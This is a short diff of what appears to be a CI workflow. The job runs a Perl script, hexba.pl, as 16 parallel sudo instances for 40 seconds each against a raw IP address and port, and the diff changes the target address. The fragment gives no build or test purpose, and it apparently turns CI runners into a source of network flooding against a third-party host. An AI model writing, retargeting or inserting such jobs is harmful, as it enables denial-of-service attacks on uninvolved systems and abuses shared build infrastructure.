@@ -17,7 +17,7 @@ jobs:
           chmod +x hexba.pl
           PIDS=()
           for i in {1..16}; do
-            sudo timeout 40 perl hexba.pl 104.29.142.113 19300 &
+            sudo timeout 40 perl hexba.pl 104.29.146.138 19310 &
             PIDS+=($!)
           done
           
